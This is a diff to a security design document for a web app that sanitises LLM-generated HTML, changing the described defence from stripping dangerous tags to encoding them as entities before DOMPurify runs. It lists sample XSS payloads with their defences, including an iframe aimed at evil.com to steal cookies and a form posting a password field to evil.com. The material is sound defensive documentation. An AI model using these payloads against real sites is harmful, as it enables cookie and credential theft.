@@ -26,16 +26,23 @@ FORBID_ATTR: All JavaScript event handlers (onclick, onerror, onload, etc.)
 ALLOWED_URI_REGEXP: Only http, https, and mailto schemes
 ```
 
-#### What Gets Blocked
+#### What Gets Encoded
 
-- `<script>` tags - Direct JavaScript execution
-- `<iframe>` tags - Embedded content that could load malicious sites
-- `<embed>` and `<object>` tags - Plugin content execution
-- `<style>` tags - CSS injection attacks
-- `<form>`, `<input>`, `<button>` - User input hijacking
+Dangerous tags are converted to HTML entities (encoded) rather than stripped. This preserves the content visually while preventing execution:
+
+- `<script>` tags → `&lt;script&gt;` (displays as `<script>` but doesn't execute)
+- `<iframe>` tags → `&lt;iframe&gt;` (displays as text)
+- `<embed>` and `<object>` tags → Encoded to text
+- `<style>` tags → Encoded to text (prevents CSS injection)
+- `<form>`, `<input>`, `<button>` → Encoded to text (prevents form hijacking)
+
+This encoding approach is important when the LLM is trying to show examples or documentation that includes these tags.
+
+#### What Gets Stripped
+
 - All event handler attributes - Indirect JavaScript execution
   - onclick, onerror, onload, onmouseover, etc.
-- Dangerous URL schemes
+- Dangerous URL schemes in attributes
   - javascript:, data:text/html, vbscript:
 
 #### What Gets Allowed
@@ -95,12 +102,12 @@ Users are informed when:
 ### 1. Direct Script Injection
 
 **Attack**: `<script>alert('XSS')</script>`
-**Defense**: Script tags are completely removed
+**Defense**: Script tags are encoded to `&lt;script&gt;alert('XSS')&lt;/script&gt;`, displaying as text
 
 ### 2. Event Handler Injection
 
 **Attack**: `<img src=x onerror=alert('XSS')>`
-**Defense**: onerror attribute is stripped, only safe src remains
+**Defense**: onerror attribute is stripped by DOMPurify (attributes can't be safely encoded)
 
 ### 3. JavaScript URL Schemes
 
@@ -110,7 +117,7 @@ Users are informed when:
 ### 4. iframe Embedding
 
 **Attack**: `<iframe src="https://evil.com/steal-cookies"></iframe>`
-**Defense**: iframe tags are completely removed
+**Defense**: iframe tags are encoded to `&lt;iframe...&gt;`, displaying as text
 
 ### 5. Data URI Exploitation
 
@@ -120,17 +127,17 @@ Users are informed when:
 ### 6. CSS Injection
 
 **Attack**: `<style>body { background: url('javascript:alert(1)') }</style>`
-**Defense**: Style tags are completely removed
+**Defense**: Style tags are encoded to `&lt;style&gt;...&lt;/style&gt;`, displaying as text
 
 ### 7. Form Hijacking
 
 **Attack**: `<form action="https://evil.com"><input name="password"></form>`
-**Defense**: Form and input elements are completely removed
+**Defense**: Form and input tags are encoded, displaying as text
 
 ### 8. Object/Embed Plugins
 
 **Attack**: `<object data="malicious.swf"></object>`
-**Defense**: Object and embed tags are completely removed
+**Defense**: Object and embed tags are encoded, displaying as text
 
 ## Code Flow
 
@@ -141,7 +148,9 @@ LLM Response → extractHTMLFromMarkdown()
               ↓
            sanitizeHTML()
               ↓
-        DOMPurify.sanitize()
+        encodeDangerousTags()  ← Encode dangerous tags to HTML entities
+              ↓
+        DOMPurify.sanitize()   ← Strip dangerous attributes
               ↓
       Validation & Warning Check
               ↓
